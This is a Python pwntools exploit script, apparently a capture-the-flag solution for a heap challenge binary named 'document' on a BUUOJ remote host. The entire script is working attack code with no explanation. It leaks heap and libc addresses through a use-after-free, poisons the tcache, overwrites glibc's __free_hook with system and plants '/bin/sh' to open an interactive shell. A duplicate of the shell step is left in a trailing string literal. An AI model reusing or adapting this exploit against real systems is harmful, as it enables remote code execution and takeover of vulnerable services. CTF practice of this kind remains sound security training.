#! /usr/bin/python

import sys
sys.path.append("/home/railgun/Desktop/LibcSearcher/")
from pwn import *
from LibcSearcher import *

#p = process('./document')
#p = remote('123.56.85.29',4807)
p = remote('node3.buuoj.cn',29142)
elf = ELF('./document')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'

def menu(c):
	p.recvuntil("choice :")
	p.sendline(str(c))
	
def add(name,sex,content):
	menu(1)
	p.recvuntil("name")
	p.send(name.ljust(8,"\x00"))
	p.recvuntil("sex")
	p.send(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,"\x00"))

def show(idx):
	menu(2)
	p.recvuntil(":")
	p.sendline(str(idx))

def delete(idx):
	menu(4)
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,sex,content=""):
	menu(3)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil("sex?")
	p.sendline(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,b"\x00"))


###leak heap###
add('Railgun','0','\x00')
add('Railgun','1','\x00')
add('Railgun','2','\x00')

delete(0)
delete(1)



show(1)
p.recvuntil('\n')
heap = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x280
success(hex(heap))

###leak libc###
edit(1,'Y','\x00')
delete(1)

add(p64(heap+0x10),'3','\x00')
add('Railgun','4','\x00')
add(p64(0x700000000000000),'5','\x00')

delete(3)
show(3)

main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96
libc_base = main_arena - 0x1e4c40
success(hex(libc_base))

###To getshell###
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

payload = '\x00' * 0x68 + p64(free_hook-0x10)
edit(5,'5',payload)

add('/bin/sh\x00','6',p64(system))
#gdb.attach(p)

###get shell###
#delete(6)
p.interactive()


'''
###To getshell###
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

payload = '\x00' * 0x68 + p64(free_hook-0x10)
edit(5,'5q',payload)

add('/bin/sh\x00','6',p64(system))
#gdb.attach(p)
'''
